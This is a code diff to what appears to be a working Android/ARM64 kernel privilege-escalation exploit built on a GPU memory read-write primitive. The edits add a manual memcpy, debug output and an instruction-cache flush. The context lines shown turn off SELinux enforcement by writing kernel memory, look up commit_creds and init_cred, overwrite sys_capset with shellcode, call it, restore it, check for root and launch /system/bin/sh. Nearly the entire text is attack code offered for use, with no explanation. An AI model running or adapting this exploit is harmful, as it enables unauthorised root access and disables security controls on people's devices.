@@ -569,6 +569,14 @@ int cheese_shutdown(struct cheese_gpu_rw* cheese) {
 #define KALLSYMS_LOOKUP_INCLUDE
 #include "kallsyms_lookup.c"
 
+static void stupid_memcpy(void* dst, const void* src, size_t count) {
+    char* d = dst;
+    const char* s = src;
+    for (size_t c = 0; c < count; c++) {
+        d[c] = s[c];
+    }
+}
+
 int main() {
     g_level1_dcache_size = tu_get_l1_dcache_size();
 #if 1
@@ -608,6 +616,7 @@ int main() {
     bool* kernel_selinux_state_enforcing_ptr = kernel_physical_base + (kernel_selinux_state_addr - kernel_virtual_base);
     fprintf(stderr, "%lx: %p\n", (kernel_selinux_state_addr - kernel_virtual_base), kernel_selinux_state_enforcing_ptr);
     *kernel_selinux_state_enforcing_ptr = false;
+    fprintf(stderr, "set selinux enforcing ptr...\n");
 
     uint64_t init_cred_addr = cheese_kallsyms_lookup(&kallsyms_lookup, "init_cred");
     uint64_t commit_creds_addr = cheese_kallsyms_lookup(&kallsyms_lookup, "commit_creds");
@@ -639,34 +648,47 @@ int main() {
 
     /* Saving sys_capset current code */
     uint8_t sys_capset[sizeof(shellcode)];
-    memcpy(sys_capset, kernel___do_sys_capset_ptr, sizeof(sys_capset));
+    fprintf(stderr, "save...\n");
+    stupid_memcpy(sys_capset, kernel___do_sys_capset_ptr, sizeof(sys_capset));
     /* Patching sys_capset with our shellcode */
-    memcpy(kernel___do_sys_capset_ptr, shellcode, sizeof(shellcode));
+    fprintf(stderr, "patch...\n");
+    stupid_memcpy(kernel___do_sys_capset_ptr, shellcode, sizeof(shellcode));
 
-    // stupidest cache flush...
+    // stupidest cache flush: write and run 16MB of nops.
     {
-        void* garbage = malloc(0x1000000);
-        memset(garbage, 0x41, 0x1000000);
-        free(garbage);
+        void* garbage = mmap(NULL, 0x1000000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
+        uint32_t* garbage_instrs = garbage;
+        for (int i = 0; i < (0x1000000 / 4) - 1; i++) {
+            garbage_instrs[i] = 0xd503201f; // nop
+        }
+        garbage_instrs[(0x1000000 / 4) - 1] = 0xD65F03C0; // ret
+        void (*garbage_fn)(void) = garbage;
+        garbage_fn();
+        munmap(garbage, 0x1000000);
     }
 
+    fprintf(stderr, "call...\n");
     /* Calling our patched version of sys_capset */
     #pragma clang diagnostic push
     #pragma clang diagnostic ignored "-Wnonnull"
     int err = capset(NULL, NULL);
+    fprintf(stderr, "called...\n");
     #pragma clang diagnostic pop
     if (err) {
         fprintf(stderr, "capset returned %d\n", err);
         return 1;
     }
+    fprintf(stderr, "restore...\n");
     /* Restoring sys_capset */
-    memcpy(kernel___do_sys_capset_ptr, sys_capset, sizeof(sys_capset));
+    stupid_memcpy(kernel___do_sys_capset_ptr, sys_capset, sizeof(sys_capset));
+    fprintf(stderr, "restored...\n");
     if (getuid() != 0) {
         fprintf(stderr, "failed to get root - rerun?\n");
         return 1;
     }
 
     execl("/system/bin/sh", "sh", NULL);
+    fprintf(stderr, "can't exec?\n");
 
     return 0;
 }
